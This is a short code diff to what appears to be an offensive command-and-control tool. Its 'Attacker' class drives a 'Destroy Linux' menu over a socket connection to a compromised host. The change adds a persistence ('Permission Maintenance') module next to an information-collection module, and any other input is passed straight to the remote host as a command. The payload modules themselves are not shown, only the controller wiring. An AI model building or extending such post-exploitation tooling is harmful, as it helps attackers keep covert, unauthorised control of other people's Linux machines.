@@ -11,6 +11,7 @@ from prompt_toolkit.history import InMemoryHistory
 sys.path.append(os.path.dirname(os.path.realpath(__file__)))
 from AuxiliaryFunctions import MyTable
 from DestroyLinux.Informations_linux import Informations_linux_main
+from DestroyLinux.PermissionMaintenance_linux import PermissionMaintenance_main_linux
 
 
 class Attacker(threading.Thread):
@@ -43,7 +44,8 @@ class Attacker(threading.Thread):
     def show_functions(self):
         print("\n" + '\033[1;34;34m' + "Destroy Linux" + '\033[0m' + "\n" + '=' * len("Destroy Linux") + "\n")
         headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
-        mydata = [["1", "Information Collection", "信息收集模块"]
+        mydata = [["1", "Information Collection", "信息收集模块"],
+                  ["2", "Permission Maintenance", "权限维持模块"]
                   ]
         MyTable.createTable(headers, mydata)
 
@@ -73,6 +75,9 @@ class Attacker(threading.Thread):
                     continue
                 elif command == '1':
                     linux_main_information = Informations_linux_main.information(self.conn)
+                    continue
+                elif command == '2':
+                    permission_maintenance = PermissionMaintenance_main_linux.PermissionMaintenance(self.conn)
                     continue
                 else:
                     self.conn.sendall(command.encode("utf-8"))
